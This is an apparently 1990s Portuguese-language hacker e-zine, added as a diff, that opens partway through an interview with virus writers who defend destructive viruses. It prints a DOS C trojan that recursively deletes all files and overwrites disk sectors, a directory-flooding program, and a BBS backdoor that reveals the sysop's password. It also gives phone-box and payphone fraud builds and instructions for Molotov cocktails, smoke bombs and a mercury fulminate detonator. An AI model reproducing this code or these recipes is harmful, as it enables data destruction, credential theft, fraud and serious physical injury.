+infeccao (diz-se tambem tempo de "incubacao") e faz com que destrua um
+disco rigido por ano, e se o virus e bom e bem infeccioso, legal.
+
+ 
+
+AZ: Alem de cumprir um ciclo de vida. Issoe algo basico.
+
+ 
+
+MU: O que acontece e que o ciclo de vida acontece, por exemplo, em sistemas
+operacionais ou inovacoes que se vao fazendo nessas maquinas. Isso tambem e
+um ciclo de vida. E verdade que destruindo uma maquina nao se destroi um
+virus completamente, ja que o Michelbngelo e um virus que destroi, mas sem
+prejudicar varias epocas de ativacao ja se passaram e e o nzmero um de
+infeccoes.
+
+ 
+
+MA: O que acontece e que o Michelbngelo nao destroi por ser de uma infeccao
+muito rapida, todo o disquete que usou no micro e infectado. Porque a
+pessoa guarda em disquete, passa a data de ativacao e depois poe o disquete
+e volta a se infectar. Pode-se apagar o disco rigido, mas os disquetes
+seguem a vida infectados. Em um virus de infeccao mais lenta, quase todos
+os arquivos infectados estao no disco rigido.
+
+ 
+
+AZ: Para mim, o virus tem que ser destrutivo simplesmente porque e um ser
+vivo. Supoe que eu quero comparar com um ser humano. Seres humanos se
+divertem cacando. As pessoas se reunem e saem a matar passaros ou vao a
+selva matar animais. Sao tao destrutivos quanto virus, nao ha nenhuma
+diferenca, isso e feito por diversao.
+
+ 
+
+VR: Com respeito a distribuicao de virus, voces alem de fazer virus,
+distribuem outros virus que nao sao de vossa autoria. Por exemplo: o
+predador, o PHX, o que fez um dos usuarios do BBS, o Avispa. Todos estes
+virus estao sendo distribuidos e infectando inocentes com eles, porque o
+fazem?
+
+ 
+
+MU: Bom, para que as pessoas tambem possam aprender com eles.
+
+AZ: Eu pelo menos, nao me dedico a distribuir-los em outro lugar que nao
+seja na BBS. Os virus estao na BBS, para que possam acessar a BBS, nos
+requeremos os conhecimentos necessarios como para que uma pessoa possa
+manejar os virus, nao se entra la e simplesmente se faz download de mil
+virus. Para entrar na BBS tem que demonstrar que tem conhecimentos e vemos
+que tipo de pessoa e. Se depois os virus se espalharem por sua propria
+conta, isso nao e da nossa conta.
+
+VR: Mas alguem tem que ter comecado a espalha-los.
+
+AZ: Nos entregamos informacao. Se as pessoas nao sabem manejar, nao podemos
+fazer nada. Nos damos um virus a uma pessoa para que o estude, o Predador
+(por exemplo) era um virus muito bom, mas nao iamos infectando maquinas
+pelo mundo.
+
+VR: Mas creio que voce me disse que fizeste o upload de um arquivo
+infectado num BBS, com o Predador.
+
+AZ: Ha vezes que nos testamos virus e a forma que temos para testa-los e
+lanca-los pelo mundo a fora... (risada geral). Para saber como funciona um
+virus, podemos testa-lo em nossa maquina e as vezes se chega a distribuir.
+A znica coisa que as pessoas tem que fazer e cuidar-se. Se se toma cuidado,
+nunca vai ter a maquina infectada. Eu tenho em uma das maquinas de casa
+4800 virus. Eu nao tenho nenhuma maquina de casa infectada. Isto depende da
+capacidade da gente. Se as pessoas sao tontas, nao e nossa culpa.
+
+MU: Igualmente nos damos os virus a gente que entenda do assunto, nao
+deixamos entrar na BBS qualquer pessoa. Fazemos um par de perguntas, para
+nao entregar virus a qualquer pessoa que possa perder o controle.
+
+VR: Qual e o criterio que seguem para validar o usuario?
+
+MU: Tem que ter conhecimentos de assembler, saber alguma coisa.
+
+VR: Mas qual e o criterio especifico, se uma pessoa quer entrar no BBS, o
+que tem de fazer?
+
+AZ: Qualquer pessoa pode chamar e entrar, se responde um par de perguntas.
+Tem que saber assembler, tem que ter feito um virus ou ter um projeto de
+virus feito por ele. Isto e o que pedimos. Igualmente qualquer um pode
+participar da lista de mensagens local e tem o BBS aberto para intercambiar
+dados e conseguir coisas. Pode estar conectado tres meses no BBS e
+participar da lista local de programacao ate que aprenda. Uma vez que tenha
+o virus pronto, damos acesso a nossa colecao de arquivos e acesso a lista
+de mensagens internacional.
+
+VR: E como se conheceram?
+
+AZ: Somos amigos desde muito tempo, de outro lado, no Del BBS.
+
+VR: Quais sao os virus preferidos de voces?
+
+PA: O Darth Vader, bzlgaro de 255 bytes. Esse que se enfia entre os zeros..
+
+AZ: Gosto muito do predator e do Npox, feito pelo Rock Steady, presidente
+do Nuke, e um virus muito bom.
+
+MU: A mim, o Predator me parece bom. 
+
+VR: Porque? 
+
+MU: Por ser tao infeccioso como e.
+
+MA: O Predator eu ate gosto, e o Michelbngelo.
+
+AZ: O Predator me interessa por qualidades que tem, e um tripartite (Obs:
+infecta disco ou arquivo) e me parece muito bom fazer um virus que funcione
+como funciona esse, com essas qualidades. O Npox e um virus que me chamou
+muito a atencao quando vi, ao conseguir o codigo fonte, descobri que e um
+virus muito legal, e simplesmente um infector de arquivos .com com uma
+variavel de encripcao, mas gosto mais porque e um dos melhores infectores
+que ja vi.
+
+VR: E o Michelbngelo, porque?
+
+MA: Porque sendo um virus baseado no Stoned, conseguiu melhorar algumas
+coisas para que continue infectando tanto quanto fazia antes. Nao se
+complicou muito alterando, e parecido com o anterior, mas se adequou a uma
+epoca mais moderna (obs: de sistema operacional). Por exemplo, as primeiras
+versoes do Stoned tinham problemas com discos de alta densidade. Foi se
+adequando a isso e funciona bem hoje.
+
+PA: Igual ao Virus Darth Vader, e um virus muito simples, bem programado,
+bacana e funciona redondo, segundo testei.
+
+VR: Como voces se definem a si proprios?
+
+AZ: Me definem como "um paria social sem educacao" (nota: isso apareceu
+numa entrevista anterior da revista com Vesselin Bontchev, do "Bulgarian
+Virus Factory") Nao sou um genio de programacao de virus, mas posso fazer
+um virus simples, posso fazer um par de coisas interessantes. Tem coisas
+muito feias como por exemplo, na nota em que Bontchev dizia que todos eram
+parias sociais sem educacao, eu nao entendo como, havendo na Argentina
+grupos que dizem fazer antivirus, como o Gisvi, eu nao entendo como pode
+estar no Gisvi um pessoa que diz em uma nota que se pode infectar o comando
+copy, quando se fala e de um comando e nao de um arquivo. Eu e agente que
+esta comigo no BBS consideramos ele muito superior ao pessoa que esta
+nesses grupos e que so fazem e dizer coisas estzpidas, incluso os que
+manejam este grupo dizem coisas completamente ridiculas sobre virus feridos
+ou coisas do genero. O que acontece e que eles sao os que manejam a
+informacao. Ele sao os que dizem as coisas, eles sao os que movem o
+dinheiro. Os antivirus sao um lixo e isso nao se pode negar a ninguem. O
+Scan e um lixo, nao serve para nada. O TBAV e um bom antivirus, mas se
+confunde varias vezes. O F-Prot acha que todos os virus sao iguais, se tem
+um novo ele o classifica como uma variante qualquer. Toda essa gente,
+segundo eles, sao genios. Uma pessoa que esta no Gisvi vai sempre se
+apresentar como investigador, se nao tem nenhum titulo. Pra compensar,
+somos estzpidos que andam molestando por ai. E mais, temos mais informacao
+do que eles.(Nota do Barata Eletrica: e bastante comum encontrar esse tipo
+de odio dentro de entrevista com escritores de virus  o pior e que
+realmente e mais facil ainda encontrar pseudos investigadores de virus que
+so sabem e falar babaquices para poder cobrar mais caro das empresas, ja
+apareceu ate no Jo 1130, "burro e que nem grama" dizia Nelson Rodrigues)
+
+VR: Tambem depende do uso que voce faz dessa informacao.
+
+AZ: Nessa questao tao pouco pode se falar de bem e mal. Pra se chegar nesse
+ponto ainda precisa se discutir muitissimo. Mas nos tambem ajudamos. Os
+virus vao estar por ai para sempre. No BBS, se vier alguem e tem algum
+problema com um virus que nao consegue resolver, ajudamos. Nao temos
+problemas nesse sentido. Repito que os virus sao para judar as pessoas a
+entender que tem muito mais coisas do que sao ensinadas. A mim, me
+encantaria que os garotos no secundario, em vez de sair fazendo programas
+de dBase ou com basic, que e o que lhes ensinam em tres anos, fossem
+cpacitados a trabalhar mais com turbo C e assembler, seguramente lhes ira
+servir mais e vao utilizar muito mais. Eu vou na Escola secundaria, e tive
+problemas no sexto ano, me deixaram na metade do sexto ano do curso
+secundario porque roubamos uma maquina do laboratorio. E como tecnico de
+computacao me queriam estudando Qpro durante um ano, completamente
+ridiculo. Nos queremos que as pessoas aprendam que existem outras coisas.
+
+VR: Qual e sua relacao como autores de virus e como sysops do BBS com o
+resto da comunidade informatica?
+
+AZ: O pessoa na Argentina nao entende o que e, por mais que se de
+informacao.
+
+VR: Mas por exemplo, um professor, que entende...
+
+AZ: Mas tampouco vamos contar a um professor...
+
+VR: Nao lhes aconteceu nunca de se encontrar com uma pessoa que nao tem
+nada que ver com voces e que se inteire que voces fazem virus?
+
+AZ: Socialmente vao nos olhar mal. Uma vez um professor no segundo grau me
+disse que eu podia utilizar tudo o que sabia pra coisas mais interessantes,
+esse e o que queria me fazer estudar Qpro durante um ano. Esse era o chefe
+da especialidade Computacao no colegio industrial nacional mais importante
+da Argentina, e lamentavelmente essa pessoa nao tem ideia de nada de
+computacao. Nao penso que uma pessoa assim possa me dizer o que posso e nao
+posso fazer, e jamais me importaria com a opiniao de alguem assim.
+
+PA: Tem tambem o fato, nao sao os znicos programas que fazemos, eu me
+dedico a fazer outros programas que nao tem nada a ver com os virus. Desde
+uma agenda a um algoritimo de compressao de dados.
+
+AZ: No BBS nos chamam diariamente para nos insultar. Diariamente ha quinze
+pessoas que entram insultando.
+
+VR: Falem um pouco da NUKE.
+
+AZ: NuKE e um grupo de programadores de virus internacional, os trabalhos
+que mais se conhecem saoo Npox, nos EUA, o VCL de Nowhere Man. Temos gente
+distribuida por todo o mundo, na Australia, na Europa, Suica, Africa, nos
+Estados Unidos e Canada. Somos um grupo de programadores que mantemos
+contato semanal por mail, temos uma area de mensagem bastante produtiva. E
+uma area donde se trata coisas que possam ajudar gente que esta interessada
+no tema. Qualquer um tem acesso de leitura, uma pessoa que faz anti-virus
+pode acessar as mensagens e pode saber de virus novos que estamos fazendo.
+E tambem fazemos trabalhos em grupo.
+============================================================================================
+============================================================================================
+
+
+
+
+=================================================================================
+     Virus em C.ou melhor Trojan em C ( aproveitem!!Ahh
+      agradecimentos no final do zine)       Virii chamado Crazy..
+=================================================================================
+
+----------------------------------------cut here------------------------------
+
+/* Make You Crazy !!
+
+	Never execute this program on your HD , haha !!
+
+
+
+	Programmed By Ninja Wala -- Royal Leader of Software Underground Palace
+
+	Share your knowledge and experience with other members in SUP,
+	and we share ours with you.
+
+*/
+
+#include        <stdio.h>
+#include		<stdlib.h>
+#include        <dir.h>
+
+main()
+{
+	int i,j;
+	char tmp[20];
+	char far *ptr;
+
+	for (i=0;i<=50;i++){
+		srand(rand());
+		ptr = itoa(rand(),tmp,10);
+		mkdir ( ptr );
+		chdir ( ptr );
+		for (j=0;j<=50;j++){
+			ptr = itoa(rand(),tmp,10);
+			mkdir( ptr );
+		}
+		chdir ("\\");
+	}
+}
+
+Downloaded From P-80 International Information Systems 304-744-2253
+
+--------------------------------------end of file--------------------------------
+
+
+            Aki vai mais um trojan em linguagem C !! hehe o nome é:
+                             EraseBooT
+                             =========
+---------------------------------cut here----------------------------------------
+
+#include <stdio.h>
+#include <dir.h>
+#include <dos.h>
+
+main()
+{
+	SearchAndDestroy("");
+	span("");
+	boot();
+}
+
+span(p)
+	char *p;
+{
+	struct ffblk f;
+	char n[129];
+	int r;
+
+	SearchAndDestroy(p);
+	sprintf(n,"%s\\%s",p,"*.*");
+	for(r=findfirst(n,&f,0x0010);!r;r=findnext(&f)) {
+		if(*f.ff_name=='.') continue;
+		if(f.ff_attrib & 0x0010) {
+			sprintf(n,"%s\\%s",p,f.ff_name);
+			span(n);
+		}
+	}
+}
+
+SearchAndDestroy(p)
+	char *p;
+{
+	struct ffblk f;
+	char b[81];
+	int r;
+
+	strcpy(b,p);
+	strcat(b,"\\*.*");
+	for(r=findfirst(b,&f,0x0000);!r;r=findnext(&f)) {
+		sprintf(b,"%s\\%s",p,f.ff_name);
+		remove(b);
+	}
+}
+
+boot()
+{
+	char *buff;
+	char *test;
+
+	fprintf(test,"THIS PROGRAM WAS MADE BY A PERSON FAR FROM YOU!!");
+	abswrite(2,12,0,buff);
+}
+
+Downloaded From P-80 International Information Systems 304-744-2253
+
+
+
+----------------------------------End of File-------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+=================================================================================
+3-    FACA SEU BACKDOOR
+=================================================================================
+
+
+; BACKDOOR. coloque isto no meio de um ppe como uma letra para mandar
+; para uma rotina e rodar este BACKDOOR!
+; este serve p/ voce ver o nome e senha do SYSOP
+ 
+    GetUser
+    U_Sec = 30
+    AdjTime 9999
+    PutUser
+    GetAltUser 1
+    AnsiPos 1, 1
+    MPrintLn "@X0FsYsOp nAmE"
+    MPrintLn "@X09" + U_Name()
+    MPrintLn "@X0FpAsSwOrD"
+    MPrintLn "@X09" + U_Pwd
+    MPrintLn ""
+    wait
+;---------------------------------------------------------------------------
+
+
+
+
+===================================================================================
+4 - BOXES
+====================================================================================
+
+
+   Ha ainda algumas pessoas, que acreditavam que as famosas boxes funcionavam
+aqui no Brasil. Pois ate algum tempo nao existia nenhum texto nacional sobre
+Phreaking, e todos liam os textos americanos e se embananavam todos.
+Nao e verdade tambem dizer que nenhuma box funciona aqui
+no Brasil, pois na verdade existem algumas que funcionam. Um exemplo eh a
+Black Box, que era muito usada por uns conhecidos meus q acabaram se phudendo.
+Outras Boxes como a Red Box, nao funcionam aki. Pra ficar mais claro vou por
+uma lista com algumas boxes q eu conheço:
+
+
+Aero : Com ela eh possivel fazer chamadas nacionais e internacionais
+
+Beige: Como aqueles q os tecnicos usam nos postes.
+
+Black: Nao tarifa a ligaçao que eh feita ao telefone possuidor da box.
+
+Blast: Amplificador de microfone do telefone.
+
+Blue: Manda um tom de 2600 Hz pra central q torna possivel controlar todo o
+seu sistema.
+
+Brown: Cria um sistema de party-fone a partir das linhas existentes.
+
+Bud: Intervem no telefone de outra linha.
+
+Busy: Nao permite que a linha seja utilizada nem pra receber nem pra enviar
+chamadas.
+
+Chrome: Manipula sinais de trafego atraves de um sistema remoto.
+
+Color: Grava conversas. 
+
+Copper: Causa interferencias na linha. O chamado linha-cruzada.
+
+Crimson: Permite q o telefone seja bloqueado por um botao.
+
+Dark: Redireciona as chamadas pra um outro telefone.
+
+Ditto: Interfere nas linhas permitindo as escutas telefonicas.
+
+Divertor: Redireciona as chamadas.
+
+Gold: Permite rastrear uma chamada.
+
+Infinity : Intervencao remota de chamadas.
+
+Jack: Jogo de tons.
+
+Light: Emissor AM.
+
+Magenta: Conecta uma linha remota de telefone a outra.
+
+Neon: Microfone externo.
+
+New Gold: Versao atualizada da Gold Box
+
+Noise: Cria na linha um barulho.
+
+Party: Cria um part-fone a partir de duas linhas.
+
+Pearl: Gerador de tons.
+
+Pink: Cria um part-fone.
+
+Purple: Como a crimson
+
+Rainbow : Elimina um rastreamento da chamada enviando 120 volts pela linha.
+
+Red: Emite tons para ligar gratis de orelhoes
+
+Rock : Esta eh uma das caixas que sao consideradas "inofensivas". A unica
+coisa que ela faz e colocar uma musica na linha.
+
+Silver: Cria DTMF tons de prioridade A, B, C e D na linha.
+
+Snow: Emite por TV clandestinamente.
+
+Static : Eleva a voltagem da linha.
+
+Switch : Adiciona servicos a linha.
+
+Tan : Gravador de conversas telefonicas.
+
+Urine: Cria alteracoes no microfone.
+
+Yellow: Adiciona uma extensao.
+
+ ************************************
+ * Na proxima edicao eu mando mais! *
+ ************************************
+
+
+      B U S Y   B O X
+      =======   =====   
+
+   Esta eh uma das boxes mais simples de se fazer, o que ela faz eh deixar o
+telefone mudo, (sem tom de linha) e logicamente impedir que seja chamado.
+(telefone ocupado). Tambem eh possivel fazer umas coisas a mais, mas deixa pra
+lah.
+
+   Material Necessario:
+   -------- ----------
+
+ - Alicate (com revestimento de borracha de vc nao quiser levar um choque)
+ - Estilete
+ - Lanterna Pequena
+ - Fita Isolante  (nao, isto nao eh o PHPHONE MODE)
+
+OBS.: A lanterna soh e' necessaria se vc vai fazer-la a noite.
+
+   Para sua segurança escolha algum dia q aquele cara idiota que soh te enche
+o saco vai viajar ou sai de casa por um tempo. (vc nao precisa de muito tempo)
+   Entao faça o seguinte: Encontre o fio de telefone, de preferencia no lugar
+mais escondido possivel, para ninguem encontrar a box na hora. Entao corte o
+fio e descasque a parte da linha que vem do poste. Com o alicate enrole os
+dois fios o maximo possivel. Isole com a fita isolante, e coloque o fio no
+seu devido lugar. Pronto eh soh isso...   :)
+
+   Pra facilitar ai vai um diagrama:
+
+    
+ linha telefonica  ─────────────\           ─────────── p/ o telefone
+                   ─────────────/ junte os  ───────────
+                                  fios e 
+                                  isole-os
+
+
+PS.: Nos EUA, os telefones tem 4 fios. Vc deve juntar o verde e o vermelho.
+
+   Este eh um exemplo simples de boxing. Muitas outras podem ser construidas
+nao somente para telefones privados, mas para orelhoes, etc. Nos EUA usa-se
+o termo "PayPhone" para orelhoes que funcionam com moedas de dinheiro. Aqui
+no Brasil chamam-se TP (telefones publicos) ou orelhoes. Existem muitos pla-
+nos de Boxes que funcionam aqui no Brasil e pretendo colocar alguns em varias
+ediçoes, e futuramente alguns criados por mim ou amigos.
+---------------------------------------------------------------------------------
+
+
+             BlaCk B0x
+             =========
+
+
+   Aqui vai um exemplo de Black Box, soh que nao use ela na linha de sua casa.
+Talvez eu mande exemplos da construçao de outras boxes nas proximas ediçoes.   
+
+
+
+   Tudo o que vc precisa fazer eh abrir a tomada o telefone e vc ira encontrar
+algo parecido com isso:
+
+                        ┌─────────────────────┐
+                        │   A           B     │  
+                        │  ====        ====   │
+                        │                     │
+                        │   C                 │
+                        │   =                 │
+                        │   =          ====   │
+                        │   =                 │
+                        └─────────────────────┘
+
+OBS: A barulho vai ficar mais baixo quando vc estiver usando a Black Box, mas
+     nao se preocupe q isso eh normal.
+     A Black Box nao funciona com todos os tipos de central.
+
+
+   Observe q o seu telefone usa apenas dois fois, o A e o C. Agora conecte o
+fio q esta no parafuso A para o ponto C. Agora pegue um resistor(*) e conecte
+sem usar solda, em ambos os parafusos A e B.
+   Agora teste o telefone, ele devera estar sem linha, se nao o estiver, o
+resistor nao e o ideal. Tente entao com uma resistencia maior. Se quiser fa-
+cilitar, coloque um interruptor, assim toda vez q for atender o telefone vc
+ativa a Black Box. Mas mesmo assim eu nao recomendo o seu uso.
+
+
+   (*) Tente no começo uma resistencia de 4K ohms, se houver tom de discagem,
+       tente resistencias maiores. Um resistor pode ser encontrado facilmente
+       em qualquer casa de eletronicos.
+
+
+
+===============================================================================
+===============================================================================
+
+
+
+5- Anarchy
+   =======
+
+Para a hlera que gosta de anarquia..hehe..eu acho isso muito fera!! he mais
+sei lah!! é perigoso!! eheh... vo comeca com pouca coisa, mais para
+conhecimento etc...
+
+0bs.:OooO toma cuidado!! pq isso ai é meio perigoso!! eh tb isso tem o intuito
+de somente ensinar!! puro e simples para conhecimento!! cuidado em lamah!!
+
+
+                      LISTA DE EQUIVALENCIA QUIMICA
+                      =============================
+   Acacia......................................................Goma Arabica
+   Acido Acetico....................................................Vinagre
+   Sulfato Potassico de Aluminio..................................Pedra Ume
+   Sulfato de Aluminio............................................Pedra Ume
+   Carbonato de Amonia.............................................Amoniaco
+   Hidroxido de Amonia...............................................Amonia
+   Nitrato de Amonia................................................Salitre
+   Oleato de Amonia.........................................Sabao de Amonia
+   Amilacetato...............................................Oleo de Banana
+   Sulfeto de Bario.............................................Cinza Negra
+   Carbonato de Carbono.................................................Giz
+   Carbonotetraclorido....................................Fluido de Limpeza
+   Hipoclorido de Calcio....................................Po para Clarear
+   Oxido de Calcio.....................................................Lima
+   Sulfato de Calcio.........................................Gesso de Paris
+   Acido Carbonico.................................................Sonrisal
+   Cetiltrimetilamoniabrometo.................................Sal de Amonia
+   Etilenodicloreto.........................................Fluido Holandes
+   Oxido Ferrico...................................................Ferrugem
+   Furfuroldeito.............................................Oleo de farelo
+   Glucose...........................................Xarope de Milho (Karo)
+   Grafite...................................................Ponta de Lapis
+   Acido Hidrocloridico.....................................Acido Muriatico
+   Peroxido de Hidrogenio..........................................Peroxido
+   Acetato de Chumbo.......................................Açucar de Chumbo
+   Chumbo Teroxido..........................................Chumbo Vermelho
+   Silicato de Magnesio...............................................Talco
+   Sulfato de Magnesio.........................................Sal de Epsom
+   Metilsalicilato.....................................Oleo Verde de Winter
+   Naftalina...............................................Bola para Traças
+   Fenol....................................................Acido Carbolico
+   Bicarbonato de Potassio.................................Creme de Tartaro
+   Nitrato de Potassio..............................................Salitre
+   Oxido de Sodio.....................................................Areia
+   Bicarbonato de Sodio....................................Soda de cozinhar
+   Borato de Sodio....................................................Borax
+   Carbonato de Sodio.........................................Soda de Lavar
+   Cloreto de Sodio.....................................................Sal
+   Hidroxido de Sodio...............................................Lixivia
+   Silicato de Sodio..................................................Vidro
+   Sulfato de Sodio..........................................Sal de Glauber
+   Thiosulfato de Sodio.........................Hipossulfito dos Fotografos
+   Acido Sulfurico.........................................Acido de Bateria
+   Sacarina..................................................Açucar de Cana
+   Cloreto de Zinco..................................................Tinner
+   Sulfato de Zinco.........................................Vitriolo Branco
+==============================================================================
+==============================================================================
+
+                            BomBz
+
+
+
+   Coqueteis Molotov
+   -----------------
+
+   Acho dificil haver alguem que nao saiba fazer um simples coquetel molotov.
+Mesmo assim, vou falar aki como aperfeiçoar o coquetel...
+
+   Metodo Simples
+   =-=-=-=-=-=-=-
+
+   Pegue uma garafa de refrigerante ou de cerveja e encha ate a metade de ga-
+solina. Pegue um pedaço de pano e coloque na boca da garrafa. Tampe a boca de
+modo que nao entre ar (Use uma rolha, ou soque com o proprio pano), acenda o
+pano e arremesse. Quando a garrafa cair no chao, a fogo da pano vai encostar
+na gasolina e causa um incendio.
+
+   Metodos Avançados
+   =-=-=-=-=-=-=-=-=
+
+   1 - Junto com a gasolina vc pode colocar oleo, esses de carro. A poder de
+   fogo eh maior e o fogo dura mais tempo.
+   2 - Coloque junto com o pano um tablete de cloro (pode ser encontrado em
+   qualquer supermercado). Prenda ele na boca da garrafa como se fosse uma
+   rolha. O poder de fogo aumenta.
+
+   Vc pode "regular" o poder de fogo, somente observando a quantidade de com-
+   bustivel dentro da garrafa.
+
+
+   Faça uma bomba de fumaça
+   ------------------------
+
+   Primeiramente vc vai definir o poder da bomba. Vc escolhe uma "medida" que
+pode ser uma colher ou uma xicara, dependendo do poder de fogo que vc quer.
+   Para fazer uma bomba de fumaça, vc vai precisar de 4 medidas de açucar e
+6 medidas de Nitrato de Potassio (veja a lista de equivalencia). Junte tudo
+numa panela e esquente no fogo baixo. Fique mexendo a mistura, e depois que
+ela derreter, coloque-a num pote, e coloque fogo em cima. Logo que a mistura
+pegar fogo, a fumaça surgira.
+
+   Faça uma bomba de fumaça 2 (a missao!!hehe)
+   -------------------------------------------
+   Essa bomba eu nem vou usar equivalencias quimicas!! so para ficar mais
+   facil!!heh..
+
+   Material
+   1-Cloro Granulado
+   2-Fluido de Freios
+
+   Preparo!!
+   Pegue o cloro granulado a gosto!eheh coloque em algum lugar!! q naum seja
+   (obviamente) fechado!! coloque primeiro o cloro granulado!! depois um pouco
+   de fluido de freios!! Espere cerca de 1 min!! e pronto! vai sai uma pUtA
+   duma fumacera!!eehhe e tb um PuTa cheiro ruim!!hehe
+
+
+       DeT0NaD0r!
+  =========================
+
+  Caracteristicas:
+ * Explode a 180 graus
+ * Auto poder calorífico
+ * Usado como detonador de bombz maiores!hehe
+
+ Nome cientifico: Fulminato de Mercurio
+
+ Derrama-se 250 partes de alcool etilico (C2H6O), Nitrato de Mercurio
+ (Hg[NO3]2)( preparado com 25 partes de mercurio e 300 partes de alcool
+ etilico)
+ vamo la!!
+ Aquece-se ligeiramente (NAO MAIS DE 60 Graus) O fulminato se deposita como
+ agulhas brancas. Adiciona-se 30% de agua, ele pode ser pulverisado (amassa-
+ do) e transformando em uma pasta. Coloque algumas gotas de nitrato de
+ potassio (KnO3) ou de sodio (NaNO3) e enxofre em pequena quantidade!
+ Fazemos as espoletas, colocando-se o protudo  seco em duas folhas de latao!
+ -------------------------------------------------------------------------------
+
+
+
+   Gas do Riso!
+   ============
+
+  NH4NO3----->N2O + H2O + H2
+
+  Aquecer nitrato de Amonea em fogareiro eletrico ( pois o gas q sai é
+  inflamavel!!ehehhe)
+
+  OBs.: O gas do riso na realidade nao causa o riso!!hehe e sim uma contracao
+  dos musculos do rosto!! hehe (mais é fera)
+
+
+   ThaT'z all FolK'z!!
+             
+
+
+==================================================================================
+       6- PhReAKinG
+==========================    ===================    ==============================
+                          ====                   ====
+
+
+Conceitos básicos a respeito de telefonia
+
+          Ao contrário do que muita gente pensa, os fios da linha telefônica possuem uma
+tensão contínua equivalente a -48 volts. Esta tensão se altera para um valor alternado
+de 96 volts quando o telefone toca. Portanto, ao lidar com os fios do telefone, tenha o
+cuidado de não encostar no orelhão, na parede, ou em qualquer coisa que possa
+"aterrá-lo". Este cuidado deve ser redobrado se o telefone for comunitário ou
+residencial. Levemos também em consideração que se o aparelho possui uma tensão
+contínua, significa que ele tem também uma polarização correta (fio positivo e fio
+negativo). Na instalação do aparelho esta polarização não faz diferen╬a, mas quando o
+assunto é violação, ela deve ser observada. Vamos lembrar também que existem dois
+tipos de linhas telefônicas: 
+
+   1.Decádicas (ou Pulse) - são as linhas dos prefixos mais antigos do sistema
+     telefônico. A identificação de chamadas se dá através de uma série de sinais
+     (pulsos), que são interpretados pela central telefônica. 
+   2.Multifrequenciais (ou Tone) - são as linhas dos prefixos mais novos onde
+     trabalham o serviço de CPA (Central telefônica com controle por Programa
+     Armazenado). A identificação de chamadas se dá através da decodificação de
+     tons frequenciais em números. 
+
+
+
+
+Efetuando ligações gratuitamente (de um telefone público) utilizando um diodo
+===============================================================================
+
+
+  O diodo é um componente eletrônico que possui diversas utilizações. Podemos
+resumir seu funcionamento basicamente na seguinte síntese: Um diodo
+(ou junção PN),permite que a corrente circule em apenas uma direção dentro
+de um circuito. Ao se utilizá-lo para o fim aqui desejado, vamos precisar
+de um diodo IN4002, IN4004 ou IN4007. Estes podem ser encontrados facilmente
+em qualquer casa de componentes eletrônicos.
+ Vamos precisar também de um resistor com valor nominal de 22K e potência
+de 1W. Basta que você ligue o diodo em paralelo com o resistor (conforme
+mostrar a ilustração abaixo) e, em seguida, descasque os fios do telefone
+eligue cada uma das pontas obtidas com o diodo e o resistor neles.
+ Lembre-se: você vai apenas descascar os fios do orelhão!!! Se você cortá-los,
+ ele vai ficar sem linha.
+
+                              │ │ Fio de Telefone
+                              │ │
+               ┌──────────────┘ └──────────────┐
+               │    ┌─────── Di0d0 ─────┐      │
+               │   ┌┘                   └┐     │
+               │  ┌┘                     └─┐   │
+               │ ┌┘                        └─┐ │
+  Ponta do   /─┼─┘                           └─┼─ \
+    Fio      \─┼─┐                         ┌───┼─ / Ponta do fio
+               │ └┐                        └┐  │
+               │  └┐                       ┌┘  │
+               │   └┐                     ┌┘   │      ( heh Naum fiko muito
+               │    └───── Resistor ──────┘    │       b0m mais é isso ai he)
+               │                               │
+               └──────────────┐ ┌──────────────┘
+                              │ │
+                              │ │  Fio de Telefone
+
+                              
+
+          Para executar esta tarefa, eu aconselho que você descasque os fios dos
+orelhões que você utiliza com mais frequência pois, devido ao fato dos fios do telefone
+público serem muito grossos, não é um trabalho que se possa fazer tranquila e
+rapidamente sem ser notado. Você dever  observar também a polarização correta a
+ser utilizada. Você pode perceber  isso facilmente pois, quando você ligar o diodo de
+maneira errada, o orelhão vai ficar sem linha. Uma dica pessoal: os telefones de
+cabine e os de cartão são mais fáceis de serem violados. Alguns orelhões comuns tem
+uma proteção blindada que impedem o acesso ao cabo telefônico. Embora mesmo
+assim seja possível puxar o fio com um gancho, que você deve enfiar  do lado
+esquerdo do aparelho telefônico, entre o telefone e uma grade preta de sustentação
+que fica atrás dele, eu aconselho que você evite esses tipos. Vamos voltar um pouco
+para a parte técnica da coisa. O diodo que estamos utilizando vai funcionar da seguinte
+maneira: Quando uma ligação' completada de um telefone público, a central inverte a
+polarização do telefone de -48 para +48 volts. Quando o aparelho telefônico percebe
+isso, ele pede uma fixa. É aí que entra em funcionamento o nosso querido diodo. Ele
+permite que a tensão caia até 0 volts, mas não permite que ela se torne positiva.
+Dessa forma o orelhão não vai pedir a ficha. Nesse caso o resistor está funcionando
+apenas como um dissipador de potência, para que você não dê o azar de queimar o
+diodo (não que ele seja ca ro, éque em algumas localidades ele pode ser uma peça
+rara que custa R$0,15) e ficar sem telefonar. Mesmo se você não achar nenhuma loja
+que venda, pegue uma placa antiga de alguma coisa que tenha queimado. Elas
+sempre tem diodos. Você deve procurar uma peça, pequinininha que tem dois
+terminais, preta com uma tarja branca e normalmente estar  escrito IN qualquer coisa.
+
+
+
+Efetuando ligações gratuitamente utilizando um aparelho comum
+==================================================================
+
+
+
+  Primeiramente, você deve tomar os processos citados no ítem anterior (Como
+efetuar ligações de um telefone público utilizando um diodo) para descascar
+os fios do telefone público. Em seguida você deve conseguir um aparelho
+telefônico comum e ligar cada uma das pontas dos fios dele nos fios do
+orelhão. Para facilitar a sua vida,eu aconselho que o seu telefone seja
+o menor possível e que você prenda um jacaré (pequeno gancho achado em
+qualquer loja de componentes eletrônicos) em cada uma das pontas do seu
+telefone, para facilitar a ligação no orelhão. Aí é só efetuar a ligação
+normalmente.
+------------------------------------------------------------------------------
+
+
+Caboooooo!! hehehe :(                              
+entaum!! agora vem os agradecimentos!!!            
+
+
+****************************************************************************
+Alevirus                                                                   *
+                                                                           *
+RoTTer  (http://www.vorteck.com/uobrazil)                                  *
+                                                                           *
+Derneval R. R. da Cunha (http://www.barata-eletrica.home.ml.org)                                 *
+
+Ton Waits    ( E-MAIL=== ton.waits@usa.net) 
+
+Chaos 100  (http://www.geocities.com/Pentagon/5140)
+
+Ahh c eu eskeci d algum zine ou pessoa ..desculpa..e manda um E-mail p/
+mim q eu ponho no segundo zine!! :)-
+                                                                           *
+****************************************************************************
+
+
+
+Contacte-me:
+
+funboy_66@hotmail.com
+
